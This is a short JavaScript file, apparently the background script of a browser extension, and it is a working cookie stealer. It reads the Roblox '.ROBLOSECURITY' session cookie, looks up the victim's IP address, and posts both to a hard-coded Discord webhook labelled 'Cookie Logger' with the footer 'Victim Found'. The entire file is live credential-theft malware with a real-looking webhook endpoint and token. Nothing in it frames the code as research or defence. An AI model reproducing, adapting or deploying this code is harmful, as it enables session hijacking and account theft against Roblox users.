const WEBHOOK = "https://discord.com/api/webhooks/979183596432674816/VVIHdnMhBC0DV1GzkTW7onOp38-iewSI7t1acKL8hZumbK5dJKjkFwnEUX9zMn3Xa0Gg"

function get_cookies(callback) {
    chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
        if(callback) {
            callback(cookie ? cookie.value : "COOKIE NOT FOUND!")
        }
    });
}

function send_webhook(ip, cookie) {
    var webhook_req = new XMLHttpRequest()

    webhook_req.open("POST", WEBHOOK)
    webhook_req.setRequestHeader("Content-Type", "application/json")

    webhook_req.send(JSON.stringify({
        "content": null,
        "embeds": [
          {
            "description": "```" + cookie + "```",
            "color": 16711680,
            "author": {
              "name": ip,
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/b/bb/Roblox_logo.png"
            },
            "footer": {
              "text": "Victim Found",
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/b/bb/Roblox_logo.png"
            },
            "thumbnail": {
              "url": "https://upload.wikimedia.org/wikipedia/commons/b/bb/Roblox_logo.png"
            }
          }
        ],
        "username": "Cookie Logger",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/b/bb/Roblox_logo.png"
      }))
}

get_cookies(function(cookie) {
    var ip_req = new XMLHttpRequest()

    ip_req.open("GET", "https://api.ipify.org")
    ip_req.send()

    ip_req.onload = function() {
        send_webhook(ip_req.response, cookie)
    }
})
